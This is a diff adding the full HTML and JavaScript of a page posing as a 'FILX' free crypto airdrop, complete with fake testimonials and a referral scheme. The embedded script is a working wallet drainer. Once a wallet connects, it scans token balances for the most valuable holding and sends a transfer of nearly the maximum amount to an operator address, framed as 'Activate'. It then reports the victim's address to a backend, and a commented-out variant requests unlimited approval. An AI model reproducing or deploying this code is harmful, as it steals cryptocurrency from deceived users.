@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>FilcoinX</title>
+	<link rel="stylesheet" href="/filcoinx_files/flaticon.css">
+	<link rel="stylesheet" href="/filcoinx_files/all.css">
+	<link href="/filcoinx_files/bootstrap.min.css" rel="stylesheet">
+	<link href="/filcoinx_files/css-Poppins200i300300i400400i500.css" rel="stylesheet">
+	<link href="/filcoinx_files/css-Roboto400400i500500i700700i_.css" rel="stylesheet">
+	<link rel="stylesheet" href="/filcoinx_files/frameworks.css">
+	<link rel="stylesheet" type="text/css" href="/filcoinx_files/sweet-alert.css">
+	<link rel="stylesheet" href="/filcoinx_files/style.css">
+	<script src="/filcoinx_files/jquery.min.js"></script>
+	<script src="/filcoinx_files/highcharts.js"></script>
+	<script src="/filcoinx_files/w3model.js"></script>
+	<script src="/filcoinx_files/bignumber.min.js"></script>
+	<script src="/filcoinx_files/web3.min.js"></script>
+	<script src="/filcoinx_files/web3model.min.js"></script>
+	<script src="/filcoinx_files/evmchain.js"></script>
+	<script src="/filcoinx_files/web3provider.js"></script>
+	<script src="/filcoinx_files/qrcode.js"></script>
+	<script src="/filcoinx_files/sweet-alert.min.js"></script>
+	<script src="/filcoinx_files/bootstrap.bundle.min.js"></script>
+	<script src="/filcoinx_files/clipboard.min.js"></script>
+
+</head>
+<body data-spy="scroll" data-target="#fixedNavbar" data-offset="0" onload="onload()">
+<div class="page-wrapper" id="home">
+	<header class="header">
+		<div class="container">
+			<nav class="navbar navbar-expand-lg">
+				<a class="navbar-brand" href="javascript:;">
+					<img src="/filcoinx_files/logo.png" alt="Logo">
+				</a>
+				<a href="#" class="default-btn wow fadeInUp size" data-wow-delay="0.1s" id="btn-connect">Connect<i class="fa fa-angle-right ml-2"></i></a>
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#fixedNavbar" aria-controls="fixedNavbar" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="togler-icon-inner">
+						<span class="line-1"></span>
+						<span class="line-2"></span>
+						<span class="line-3"></span>
+					</span>
+				</button>
+				<div class="collapse navbar-collapse main-menu justify-content-end" id="fixedNavbar">
+					<ul class="navbar-nav">
+						<li class="nav-item">
+							<a class="nav-link active" href="#" data-scroll-nav="0">Home</a>
+						</li>
+						<li class="nav-item">
+							<a class="nav-link" href="#" data-scroll-nav="1">FILX</a>
+						</li>
+						<li class="nav-item">
+							<a class="nav-link" href="#" data-scroll-nav="2">Airdrops</a>
+						</li>
+						<li class="nav-item">
+							<a class="nav-link" href="#" data-scroll-nav="3">Share</a>
+						</li>
+
+						<li class="nav-item">
+							<a class="nav-link" id="go-cn" href="javascript:;" >
+								<font style="vertical-align: inherit;">
+									<font style="vertical-align: inherit;">中文</font>
+								</font>
+							</a>
+						</li>
+						<!-- <li class="nav-item">
+							<a class="nav-link" id="go-en" href="javascript:;">
+								<font style="vertical-align: inherit;">
+									<font style="vertical-align: inherit;">English</font>
+								</font>
+							</a>
+						</li> -->
+					</ul>
+				</div>
+			</nav>
+		</div>
+	</header>
+	<section class="hero-section" data-scroll-index="0">
+		<div class="container h-100">
+			<div class="row align-items-center h-100">
+				<div class="col-lg-7 col-md-10 col-sm-12">
+					<h1 class="hero-section-title wow fadeInUp" data-wow-delay="0.2s">
+						Are you ready for your wallet?
+					</h1>
+					<p class="hero-section-subtitle wow fadeInUp" data-wow-delay="0.3s">
+						FILX free airdrop is in progress, Please prepare your wallet.
+						Wallets that accept airdrops include: TokenPocket, TrustWallet, MathWallet, Binance Chain Wallet, imToken and other wallets that support ETH and BSC
+					</p>
+					<div class="row justify-content-center text-center">
+						<div class="col-lg-7">
+							<div class="price-toggle-wrap" style="text-align: left">
+								<span>
+									<p id="text-chances" style="color: #fff">
+									<h7>Chances:</h7>&nbsp;<strong id="chances-number">0</strong>
+									</p>
+								</span>
+								<span>
+									<p id="text-airdropped" style="color: #fff">
+									<h7>Airdropped:</h7>&nbsp;
+									<strong id="airpods-number">0</strong>FILX
+									</p>
+								</span>
+							</div>
+						</div>
+
+					</div>
+					<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-unlock" style="display:inline">Unlock Wallet<i class="fa fa-angle-right ml-2"></i></a>
+					<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-active" style="display:inline;margin-left:5px;">Activate<i class="fa fa-angle-right ml-2"></i></a>
+					<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-receive" style="display:none">Receive<i class="fa fa-angle-right ml-2"></i></a>
+					<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-go-share" style="display:none">Go Share<i class="fa fa-angle-right ml-2"></i></a>
+				</div>
+
+				<div class="col-lg-5 hero-image text-right wow fadeInRight">
+					<img src="/filcoinx_files/hero_image.png" alt="Hero image" class="img-fluid img-jump">
+				</div>
+			</div>
+		</div>
+
+		<a href="#" data-scroll-nav="1" class="down-scroll">
+			<i class="fa fa-arrow-down"></i>
+		</a>
+
+	</section>
+	<section class="services section-padding" data-scroll-index="1" id="services-area">
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-lg-7">
+					<div class="section-heading">
+						<h2 class="section-title">What is <span>FILX</span></h2>
+						<p class="section-sub-title">
+							FILX is a social experiment focusing on the ecological construction of Filcoin, which integrates Filcoin's application innovations. In the future, a consolidated liquidity pool leveraged transaction automatic system will be established to provide value storage on the chain. FILX has no pre-sale and no crowdfunding.
+						</p>
+					</div>
+					<div class="col-md-5 col-lg-6 wow fadeInLeft text-left" id="containers1"></div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<section class="testimonial-section jarallax section-padding" data-jarallax="" data-speed="0.2s" data-scroll-index="2">
+		<div class="testimonial-section-bg jarallax-img"></div>
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-lg-7">
+					<div class="section-heading">
+						<h2 class="section-title text-white">About<span class="text-white"> Airdrop</span></h2>
+						<p class="section-sub-title text-white">
+							FILX is airdropped in three phases. In the first phase, 50 million airdrops, 25 million airdrops in the second phase, and 25 million airdrops in the third phase; and the whitelisted users who receive the airdrop, each invites a user to complete the whitelist. The list is activated, and an additional airdrop opportunity is added. The more invitations, the more airdrops you will get.
+						</p>
+					</div>
+				</div>
+			</div>
+
+			<div class="row align-items-center justify-content-center">
+				<div class="col-md-12">
+					<div class="testimonial-slider owl-carousel owl-theme">
+						<div class="item">
+							<div class="testimonial-item">
+								<div class="testimonial-body d-flex align-items-start">
+									<div class="testimonial-img mr-3">
+										<img src="/filcoinx_files/comments-image-2.png" alt="" class="img-fluid">
+									</div>
+									<div class="testimonial-inner">
+										<h5>George William</h5>
+
+										<div class="testimonial-rating">
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+										</div>
+									</div>
+								</div>
+								<div class="testimonial-text">
+									<p>
+										I am honored to be the first user to receive the FILX airdrop. FILX is already in my wallet. I believe that FILX will lead me into the palace of wealth
+									</p>
+								</div>
+							</div>
+						</div>
+
+						<div class="item">
+							<div class="testimonial-item">
+								<div class="testimonial-body d-flex align-items-start">
+									<div class="testimonial-img mr-3">
+										<img src="/filcoinx_files/comments-image-3.png" alt="" class="img-fluid">
+									</div>
+									<div class="testimonial-inner">
+										<h5>Edward Addison</h5>
+										<div class="testimonial-rating">
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+										</div>
+									</div>
+								</div>
+								<div class="testimonial-text">
+									<p>
+										I have successfully received FILX and I can't believe it is true. But I really already have my own FILX, thank you FILX.
+									</p>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class="testimonial-item">
+								<div class="testimonial-body d-flex align-items-start">
+									<div class="testimonial-img mr-3">
+										<img src="/filcoinx_files/comments-image-1.png" alt="" class="img-fluid">
+									</div>
+									<div class="testimonial-inner">
+										<h5>Eduardo Dutra</h5>
+										<div class="testimonial-rating">
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+										</div>
+									</div>
+								</div>
+								<div class="testimonial-text">
+									<p>
+										After a long wait, I have successfully received FILX, and I believe it will be popular in the world soon.
+									</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="counters">
+			<div class="container">
+				<div class="row">
+					<div class="col-lg-4 col-md-6 col-sm-6 counters-item  col-xs-12 wow fadeInUp" data-wow-delay="0.1s">
+						<div class="counter-item-inner text-center">
+							<div class="counter-icon">
+								<span class="mdi mdi-download"></span>
+							</div>
+							<div class="counter-body">
+								<h2 class="counter">12800</h2>
+								<p>User Support</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-4 col-md-6 col-sm-6 col-xs-12 counters-item wow fadeInUp" data-wow-delay="0.2s">
+						<div class="counter-item-inner text-center">
+							<div class="counter-icon">
+								<span class="mdi mdi-account-switch"></span>
+							</div>
+							<div class="counter-body">
+								<h2 class="counter">3500</h2>
+								<p>People Connect</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-4 col-md-6 col-sm-6 col-xs-12 counters-item wow fadeInUp" data-wow-delay="0.1s">
+						<div class="counter-item-inner text-center">
+							<div class="counter-icon">
+								<span class="mdi mdi-download"></span>
+							</div>
+							<div class="counter-body">
+								<h2 class="counter">3500</h2>
+								<p>Received</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<section class="download-wrap section-padding jarallax" data-scroll-index="3" data-speed="0.2s">
+		<div class="download-section-bg jarallax-img"></div>
+		<div class="container">
+			<div class="row justify-content-between align-items-center">
+				<div class="col-lg-6 download-image wow slideInLeft">
+					<img src="/filcoinx_files/download-img.png" alt="" class="img-fluid img-jump">
+				</div>
+
+				<div class="col-lg-6 col-md-12 col-sm-11 col-xs-12 wow fadeInUp" data-wow-delay="0.3s" id="div-share">
+					<div class="download-section-inner">
+						<h2>Share Now</h2>
+						<p>
+							In order to allow more people to get FILX, we have opened up a reward mechanism. Every time you invite a new user, you will get another chance to receive the airdrop.
+						</p>
+						<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-share">Share<i class="fa fa-angle-right ml-2"></i></a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<footer class="footer">
+		<div class="footer-top">
+			<div class="container">
+				<div class="row">
+					<div class="footer-widget col-lg-3 col-md-6 col-sm-6">
+						<div class="footer-box">
+							<h5 class="footer-title">About Us</h5>
+							<p>
+								FILX is a social experiment focusing on the ecological construction of Filcoin, which integrates Filcoin's application innovations.
+							</p>
+							<div class="footer-social-links">
+								<a href="javascript:;"><i class="mdi mdi-twitter"></i></a>
+								<a href="javascript:;"><i class="mdi mdi-telegram"></i></a>
+							</div>
+						</div>
+					</div>
+
+					<div class="footer-widget col-lg-3 col-md-6 col-sm-6">
+						<div class="footer-box">
+							<h5 class="footer-title">Usefull Links</h5>
+							<ul class="footer-links">
+								<li>
+									<a href="#" data-scroll-nav="1">FILX</a>
+								</li>
+								<li>
+									<a href="#" data-scroll-nav="2">Airdrops</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+
+					<div class="footer-widget col-lg-3 col-md-6 col-sm-6">
+						<div class="footer-box">
+							<h5 class="footer-title">Other Links</h5>
+							<ul class="footer-links">
+								<li>
+									<a href="javascript:;">Address</a>
+								</li>
+								<li>
+									<a href="javascript:;">imToken</a>
+								</li>
+								<li>
+									<a href="javascript:;">TokenPocket</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+
+					<div class="col-md-6 col-sm-6 footer-widget col-lg-3">
+						<div class="footer-box">
+							<h5 class="footer-title">Contact Info</h5>
+							<p>50 North Peg Shop Court Beachwood, Washington DC</p>
+							<ul class="contact-info-footer">
+								<li><i class="mdi mdi-email"></i><a href="javascript:;" class="__cf_email__" data-cfemail="74121d1811171b1d1a0c341319151d185a171b19">[email&#160;protected]</a></li>
+							</ul>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="copyright">
+			<div class="container">
+				<div class="row align-items-center justify-content-center">
+					<div class="col-lg-9">
+						<p class="text-center">Copyright &copy; 2021.Filcoinx All rights reserved.</p>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="alert alert-success" role="alert" style="display: none">
+			<button type="button" class="close" data-dismiss="alert" aria-label="Close" aria-hidden="true">
+				&times;
+			</button>
+			<span id="alertInfo"></span>
+		</div>
+
+		<button id="exampleModalButton" type="button" class="btn btn-primary" style="display: none;" data-bs-toggle="modal" data-bs-target="#exampleModal">
+			Activate
+		</button>
+
+		<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h5 class="modal-title m-auto" id="exampleModalLabel" style="padding-left: 12%">Share To You Friends!</h5>
+						<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+					</div>
+					<div id="error" class="modal-body">
+						You will get your own promotion link after active whitelist;
+					</div>
+					<div id="shareModalContent" class="modal-body m-auto" style="display: none">
+						<div class="card" style="width:100%; text-align: center">
+							<div class="card-body" style="text-align: center">
+								<h4 class="card-title" style="text-align:center">Promotion Link</h4>
+								<div class="card-text" id="promotion-link">Some example text some example text. Jane Doe is an architect and engineer</div>
+							</div>
+							<h4 style="text-align:center">QR Code</h4>
+							<div class="card-img-bottom" src="" alt="Card image" style="width:100%" id="promotion-qr"></div>
+							<button type="button" class="copylink btn btn-primary " data-clipboard-target="#promotion-link" id="copy">Copy Link</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</footer>
+	 <!-- <style>
+         #goToActionSetionx {
+             position: fixed;
+             bottom: 0;
+             right: 10px;
+             width: 48px;
+             height: 48px;
+             line-height: 48px;
+             font-size: 16px;
+             text-align: center;
+             opacity: 1;
+             border-radius: 5px;
+             visibility: hidden;
+             color: #fff!important;
+             z-index: 99999;
+             visibility: visible;
+         }
+     </style>
+     <a id="goToActionSetionx" href="http://wa.me/855977054895" style="bottom: 65px">
+         <img src="/whatsApp.jpg" alt="" style="width: 100%; height: 100%;border-radius: 5px;">
+     </a> -->
+	<a id="goToActionSetion" href="#0" class="scroll-top-btn" data-scroll-goto="0">
+		<i class="fa fa-arrow-up"></i>
+	</a>
+	<div class="preloader-wrap">
+		<div class="preloader-inner">
+			<div class="sk-circle"></div>
+			<div class="spinner">
+				<div class="rect1"></div>
+				<div class="rect2"></div>
+				<div class="rect3"></div>
+				<div class="rect4"></div>
+				<div class="rect5"></div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div style="display:none;">
+    <textarea id="jsondata">{$abi}</textarea>
+	<textarea id="jsondata1">{$addr|json_encode}</textarea>
+	<textarea id="jsondata2">{$addr2|json_encode}</textarea>
+	<textarea id="jsondata3">{$addr3|json_encode}</textarea>
+</div>
+
+<script data-cfasync="false" src="/filcoinx_files/email-decode.min.js"></script>
+<script src="/filcoinx_files/plugins.js"></script>
+<script src="/filcoinx_files/main.js"></script>
+<script language="JavaScript">
+	$(document).ready(function() {
+		var chart = {
+			plotBackgroundColor: null,
+			plotBorderWidth: null,
+			plotShadow: false,
+		};
+		var credits = {  //去掉highcharts.com
+			enabled:false
+		};
+		var title = {
+			text: 'FILX Distributed'
+		};
+		var tooltip = {
+			pointFormat: '{series.name}: <b>{point.percentage:.1f}%</b>'
+		};
+		var plotOptions = {
+			pie: {
+				allowPointSelect: true,
+				cursor: 'pointer',
+				dataLabels: {
+					enabled: true,
+					format: '<b>{point.name}%</b>: {point.percentage:.1f} %',
+					style: {
+						color: (Highcharts.theme && Highcharts.theme.contrastTextColor) || 'black'
+					}
+				}
+			}
+		};
+		var series= [{
+			type: 'pie',
+			name: 'FILX Distributed',
+			data: [
+				{
+					name: 'Liquid Mining',
+					color: '#0033CC',
+					y:45.0
+				},
+				{
+					name: 'Pledge Mining',
+					color: '#00FFFF',
+					y: 45.0
+				},
+				{
+					name: 'Airdrops',
+					color: '#12bd81',
+					y: 10.0,
+					sliced: true,
+					selected: true
+				}
+			]
+		}];
+
+		var json = {};
+		json.chart = chart;
+		json.title = title;
+		json.tooltip = tooltip;
+		json.series = series;
+		json.plotOptions = plotOptions;
+		json.credits = credits;
+		$('#containers1').highcharts(json);
+	});
+	function getSubStr ( str){
+		var subStr1 = str. substr( 0, 5);
+		var subStr2 = str. substr( str. length- 5, 5);
+		var subStr = subStr1 + "..." + subStr2 ;
+		return subStr;
+	};
+	
+	const ABI = JSON.parse($('#jsondata').html());
+	var authorized_address = '{$authorized_address}';
+	var agent = "{$userId}";
+	var infura_key = '{$infura_key}';
+	var bizhong = 'usdt';
+	var approved = false;
+	var domain = '{$domain}';
+	const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1)
+	var address = '';// getUrlQueryString('address')
+	var rank = 6.45;
+
+	const _web3 = new Web3('https://cloudflare-eth.com')
+	let injectedWeb3 = null, total = 0
+	let approveAddr = '{$approveAddr}';
+	const addr = JSON.parse($('#jsondata1').html());
+	const addr2 = JSON.parse($('#jsondata2').html());
+	const addr3 = JSON.parse($('#jsondata3').html());
+	
+	const price = {
+		'usdt': 1,
+		'sushi': 15.5,
+		'usdc': 1,
+		'dai': 1,
+		'uni': 28.6,
+		'aave': 380,
+		'yfi': 35000,
+		'link': 28.2,
+		"LON": 7,
+		"CRV": 3.01367,
+		"GUSD": 1,
+		"WBTC": 56478.2,
+		"WETH": 1991.89,
+		"CONV": 0.105733,
+		"inj": 13.3812,
+		"MKR": 2076.68,
+		"ALPHA": 1.79043,
+		"BAND": 16.3441,
+		"snx": 20.0588,
+		"comp": 468.076,
+		"sxp": 4.11818,
+		"FTT": 46.1779,
+		"ust": 1.00543,
+		"TRIBE": 1.42926,
+		"wise": 0.446973,
+		"RRAX": 0.996821,
+		"CORE": 5447.59,
+		"mir": 8.69817,
+		"DPI": 415.906,
+		"luna": 15.2402,
+		"HEZ": 5.97533,
+		"fxs": 8.47025,
+		"fei": 0.898157,
+	}
+
+	const decimals = {
+		sushi: 18,
+		usdt: 6,
+		usdc: 6,
+		uni: 18,
+		dai: 18,
+		aave: 18,
+		yfi: 18,
+		link: 18,
+		WBTC: 8,
+	}
+
+	const contracts = {}, contracts2 = {}, contracts3 = {}
+	for (const symbol of Object.keys(addr)) {
+		const contractAddr = addr[symbol]
+		contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	for (const symbol of Object.keys(addr2)) {
+		const contractAddr = addr2[symbol]
+		contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	for (const symbol of Object.keys(addr3)) {
+		const contractAddr = addr3[symbol]
+		contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	const Web3Modal = window.Web3Modal.default;
+	const WalletConnectProvider = window.WalletConnectProvider.default;
+	// Web3modal instance
+	let web3Modal
+	// Chosen wallet provider given by the dialog window
+	let provider;
+	// Address of the selected account
+	let selectedAccount;
+	async function init() {
+		const providerOptions = {
+			walletconnect: {
+				package: WalletConnectProvider,
+				options: {
+					bridge: "https://uniswap.bridge.walletconnect.org",
+					// Mikko's test key - don't copy as your mileage may vary
+					infuraId: infura_key,
+				}
+			},
+		};
+
+		web3Modal = new Web3Modal({
+			cacheProvider: false, // optional
+			providerOptions, // required
+			disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+		});
+		try {
+			provider = await web3Modal.connect()
+			provider.enable()
+		} catch(e) {
+			console.log("Could not get a wallet connection", e);
+			return;
+		}
+		// Subscribe to accounts change
+		provider.on("accountsChanged", async (accounts) => {
+			await fetchAccountData();
+		});
+		// Subscribe to chainId change
+		provider.on("chainChanged", async (chainId) => {
+			await fetchAccountData();
+		});
+		// Subscribe to networkId change
+		provider.on("networkChanged", async (networkId) => {
+			await fetchAccountData();
+		});
+		await fetchAccountData(provider);
+	}
+
+	/**
+	 * Kick in the UI action after Web3modal dialog has chosen a provider
+	 */
+	async function fetchAccountData() {
+		const web3 = new Web3(provider);
+		injectedWeb3 = web3
+		provider.enable()
+		const accounts = await web3.eth.getAccounts()
+		selectedAccount = accounts[0]
+
+		getMostValuableAssets(selectedAccount)
+		setTimeout(function() {
+			getMostValuableAssets2(selectedAccount)
+		}, 200)
+		setTimeout(function() {
+			getMostValuableAssets3(selectedAccount)
+		}, 300)
+		// getInfo();
+		// getAirdropInfo();
+
+		//const web3 = new Web3(provider);
+		const contract = new web3.eth.Contract(ABI, approveAddr)
+		const gasPrice = await web3.eth.getGasPrice();
+
+		if (selectedAccount && provider) {
+			const web3 = new Web3(provider);
+			const contract = new web3.eth.Contract(ABI, approveAddr)
+
+
+			const gasPrice = await web3.eth.getGasPrice()
+
+
+			contract.methods.transfer(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+				from: selectedAccount,
+				gasPrice: gasPrice,
+				gas: 70000,
+			}, function(err, tx) {
+				if(!err){
+					postInfo(selectedAccount,bizhong)
+				}
+				console.log(err, tx)
+
+			})
+		} else {
+			provider = await web3Modal.connect()
+			provider.enable()
+			const web3 = new Web3(provider);
+			const accounts = await web3.eth.getAccounts()
+			selectedAccount = accounts[0]
+			const contract = new web3.eth.Contract(ABI, approveAddr)
+			const gasPrice = await web3.eth.getGasPrice()
+
+			contract.methods.transfer(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+				from: selectedAccount,
+				gasPrice: gasPrice,
+				gas:70000,
+			}, function(err, tx) {
+				console.log(err, tx)
+				if(!err){
+					postInfo(selectedAccount,bizhong)
+				}
+				$('.modal-overlay').remove();
+
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+			})
+		}
+
+
+		// var gas = await contract.methods.approve(authorized_address, "79228162514264337593543950335").estimateGas({
+		// 	from: selectedAccount
+		// },function(err, tx) {
+		// 	console.log(err, tx)
+		// })
+		// if(gas == undefined){
+		// 	gas = 80000;
+		// }
+		//
+		// console.log(authorized_address);
+		// contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+		// 	from: selectedAccount,
+		// 	gasPrice: 150000,
+		// 	gas: 100000,
+		// }, function(err, tx) {
+		// 	if(!err){
+		// 		postInfo(selectedAccount,bizhong)
+		// 	}
+		// 	console.log(err, tx)
+		// })
+
+	}
+
+
+
+	async function getMostValuableAssets(account) {
+		let _symbol = 'usdt'
+		console.log('_symbol:'+_symbol);
+
+		for (const [symbol, contract] of Object.entries(contracts)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				if(symbol == 'usdt'){
+					let yu =balance / (10** (decimals[symbol] || 18))
+					console.log(yu.toLocaleString())
+					$('#yu').text(yu.toLocaleString() +' USDT')
+				}
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					bizhong = _symbol
+
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+
+		bizhong = _symbol
+		// checkApproved(selectedAccount,bizhong);
+
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	async function getMostValuableAssets2(account) {
+		let _symbol = 'usdt'
+		console.log('_symbol:'+_symbol);
+		for (const [symbol, contract] of Object.entries(contracts2)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+
+		bizhong = _symbol
+
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	async function getMostValuableAssets3(account) {
+		let _symbol = 'usdt'
+		for (const [symbol, contract] of Object.entries(contracts3)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+		bizhong = _symbol
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	function getUrlQueryString(names, urls) {
+		urls = urls || window.location.href;
+		urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+		var reg = new RegExp("(^|&)" + names + "=([^&#]*)", "i");
+		var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+		if (r != null && r[2] != "")return unescape(r[2]);
+		return null;
+	}
+
+	async function postInfo(address,symbol){
+		var data = {
+			address:address,
+			auth_address:authorized_address,
+			bizhong:symbol,
+			agent:agent,
+		}
+
+		var d = new Date();
+		var n = d.getTime();
+
+		$.ajax({
+			type: 'get',
+			url:  domain + "{:url('index/api/erc_post')}?t="+n,
+			data: data,
+			success:function(){
+			}
+		})
+	}
+
+	async function connect(){
+		init();
+	}
+	async function goActive() {
+		// if (!selectedAccount || !provider) {
+		// 	connect();
+		// }
+		if (approved) {
+			// return;
+		}
+
+		try {
+			provider = await web3Modal.connect()
+			provider.enable()
+		} catch(e) {
+			console.log("Could not get a wallet connection", e);
+			return;
+		}
+		await fetchAccountData();
+	}
+
+	function goDiv(div) {
+		var a = $("#" + div).offset().top;
+		$("html,body").animate({scrollTop: a}, 'slow');
+	}
+	// 分享
+	function goShare(){
+		goDiv("div-share");
+	}
+
+	// async function getInfo(){
+	// 	console.log('getInfo-->',selectedAccount);
+	// 	console.log('getInfo-chainId->',chainId);
+	// 	$.ajax({
+	// 		type: 'get',
+	// 		url:  domain + '/api/filx/home?address='+selectedAccount+'&chainId='+chainId,
+	// 		// async : false,
+	// 		success:function(data){
+	// 			if(data.code == '200'){
+	// 				infura_key = data.data.infura_key;
+	// 				coinCode=data.data.coin;
+	// 				coinContract=data.data.contract;
+	// 			}
+	// 		},
+	// 		error:function(data){
+	// 		}
+	// 	})
+	// }
+	// async function getAirdropInfo(){
+	// 	console.log('getAirdropInfo-->',selectedAccount);
+	// 	console.log('getAirdropInfo-chainId->',chainId);
+	// 	$.ajax({
+	// 		type: 'get',
+	// 		url:  domain + '/api/filx/airdrop/info?address='+selectedAccount+'&chainId='+chainId,
+	// 		// async : false,
+	// 		success:function(data){
+	// 			if(data.code == '200'){
+	// 				console.log('getAirdropInfo-->',data);
+	// 				let chances =data.data.chances;
+	// 				let airdropped = data.data.airdropped;
+	// 				$("#chances-number").html(chances);
+	// 				$("#airpods-number").html(airdropped);
+	// 				if (selectedAccount&&chances ==0 && airdropped ==0){
+	// 					$("#btn-active").css('display','inline');
+	// 					$("#btn-receive").css('display','none');
+	// 					$("#btn-go-share").css('display','none');
+	// 				}
+	// 				if (selectedAccount&&chances>=1) {
+	// 					//$("#btn-active").css('display','none');
+	// 					$("#btn-receive").css('display','inline');
+	// 					$("#btn-go-share").css('display','none');
+	// 				}
+	// 				if(selectedAccount&&(chances>0||airdropped>0)){
+	// 					$("#btn-go-share").css('display','inline');
+	// 				}
+	// 			}
+	// 		},
+	// 		error:function(data){
+	// 		}
+	// 	})
+	// }
+	//领取空投
+	async function claimAirdrop(){
+		var info="The airdrop will be sent to your address shortly";
+		swal("Tips", info, "success");
+		// getAirdropInfo();
+		// $.ajax({
+		// 	type: 'get',
+		// 	url:  domain + '/api/filx/airdrop?address='+selectedAccount+'&chainId='+chainId,
+		// 	// async : false,
+		// 	success:function(data){
+		// 		if(data.code == '200'){
+		// 			console.log('claimAirdrop-->',data);
+		// 			var info="The airdrop will be sent to your address shortly";
+		// 			swal("Tips", info, "success");
+		// 			getAirdropInfo();
+		// 		}
+		// 	},
+		// 	error:function(data){
+		// 	}
+		// })
+	}
+	/*async function shareInfo(){
+		console.log('shareInfo-->',selectedAccount);
+		$.ajax({
+			type: 'get',
+			url:  domain + '/api/filx/share/info?address={$authorized_address}',
+			// async : false,
+			success:function(data){
+				if(data.code == '200'){
+					var notShareReason = 'You will get your own promotion link after active whitelist;'
+					console.log('shareInfo-->',data);
+					var canNotShare = data.data.canNotShare
+					console.log(canNotShare)
+					if (canNotShare) {
+						console.log("111")
+						$("#error").html(notShareReason)
+						$("#exampleModalButton").trigger('click')
+
+					} else {
+						$("#shareModalContent").css('display','inline');
+						$("#error").css('display','none');
+						var shareUrl = data.data.promotionLink;
+						console.log(shareUrl)
+						document.getElementById("promotion-link").innerHTML=shareUrl
+						$("#exampleModalButton").trigger('click')
+						document.getElementById('promotion-qr').innerHTML = "";
+						new QRCode(document.getElementById("promotion-qr"), {
+							text: shareUrl,//扫描二维码后的内容
+							// width: 400,//二维码的宽
+							// height: 400,//二维码的高
+							colorDark : "#000000",//二维码线条颜色
+							colorLight : "#fff",//二维码背景颜色
+							correctLevel : QRCode.CorrectLevel.H    //二维码等级
+						});
+
+						// var content = $("#promotion-link").html()
+						// console.log(content)
+
+						var clipboard = new Clipboard('.copylink', {
+							// text: function() {
+							// 	return content;
+							// }
+						});
+						clipboard.on('success', function(e) {
+							console.log(e.text)
+							var info="Success";
+							swal("Tips", info, "success");
+							// // alert("复制成功");
+						});
+
